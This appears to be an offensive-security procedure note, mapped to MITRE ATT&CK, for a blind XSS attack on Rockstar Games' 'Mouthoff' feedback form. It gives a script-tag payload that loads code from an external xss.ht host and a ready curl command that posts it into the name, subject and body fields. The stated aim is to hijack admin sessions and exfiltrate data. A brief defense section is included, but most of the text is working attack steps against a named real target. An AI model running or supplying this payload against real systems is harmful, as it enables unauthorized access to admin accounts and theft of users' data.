---
tags:
  - xss
  - blind-xss
  - web-exploit
  - injection
type: procedure
tools:
  - '[[tools/xss-ht]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-submit-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:28.952Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: de9451a5-1a9d-46c6-97ed-7ebf04fa5491
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Blind-XSS-Payload-into-Feedback-Form

## Summary

This procedure exploits a Blind XSS vulnerability in the Rockstar Games 'MOUTHOFF TO ROCKSTAR' feedback form by submitting a malicious JavaScript payload via POST request. The payload is stored without immediate execution but triggers when an admin reviews the submission in their internal Angular JS-based CMS panel, allowing for potential session hijacking and data exfiltration.

## Description

The attack targets the feedback submission endpoint at https://www.rockstargames.com/mouthoff/mouthoff/submit.json. User inputs in fields like name, subject, and body are insufficiently sanitized, enabling storage of XSS payloads. Execution occurs in the admin context, where Angular JS rendering fails to escape the input, leading to arbitrary JavaScript execution. This can steal admin cookies for account takeover, disclose user data (usernames, IPs, comments), reveal internal paths/domains, and escalate to RCE via Angular sandbox escapes. No authentication is required for submission, making it accessible to unauthenticated attackers. Verification relies on external services like xss.ht to detect blind execution.

## Requirements

1. Internet access to reach the target website
2. curl or similar HTTP client for POST requests
3. Access to an external XSS detection service like xss.ht for payload verification
4. Basic knowledge of XSS payloads and HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., using libraries like DOMPurify) for all user inputs in admin panels
- Use Content Security Policy (CSP) to restrict script sources in the admin interface
- Monitor for anomalous admin panel activity, such as unexpected JavaScript loads from external domains
- Validate and escape all stored data before rendering in Angular JS templates

## Objectives

1. Store a malicious XSS payload in the feedback system
2. Achieve JavaScript execution in the admin review context
3. Exfiltrate sensitive admin session data and internal information

## Instructions

### Step 1: Prepare the XSS Payload

**Context**: Craft a payload that evades basic filters and loads an external script for blind detection. Use a service like xss.ht to host the script and capture execution callbacks.

No command required; manually construct the payload: '"'><script src=https://abhartiya.xss.ht></script>' (replace abhartiya with your subdomain).

> This payload closes HTML attributes and injects a script tag. Expected output: Payload ready for form fields.

### Step 2: Submit the Payload via POST Request

**Context**: Send the payload to the vulnerable endpoint using a tool like curl, populating multiple fields to increase chances of execution.

**Command** ([[commands/curl-submit-xss-payload]]):
```bash
curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json \
  -d "name=\"\'><script src=https://abhartiya.xss.ht></script>'" \
  -d "subject=\"\'><script src=https://abhartiya.xss.ht></script>'" \
  -d "body=\"\'><script src=https://abhartiya.xss.ht></script>'" \
  -d "email=test@gmail.com" \
  -d "age=30" \
  -d "category_id=1"
```

> This command submits the form data. Expected output: Server response (e.g., JSON success message). Monitor xss.ht for hits indicating execution.

### Step 3: Verify Execution

**Context**: Check the external service for confirmation of blind XSS trigger, typically within minutes if an admin reviews the submission.

No command; visit https://abhartiya.xss.ht in a browser.

> Expected output: Logged request details including admin IP, user-agent, and any exfiltrated data if payload is modified.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-submit-xss-payload]]

## Tools Used

- [[tools/xss-ht]]

## Tags

- xss
- blind-xss
- web
- injection
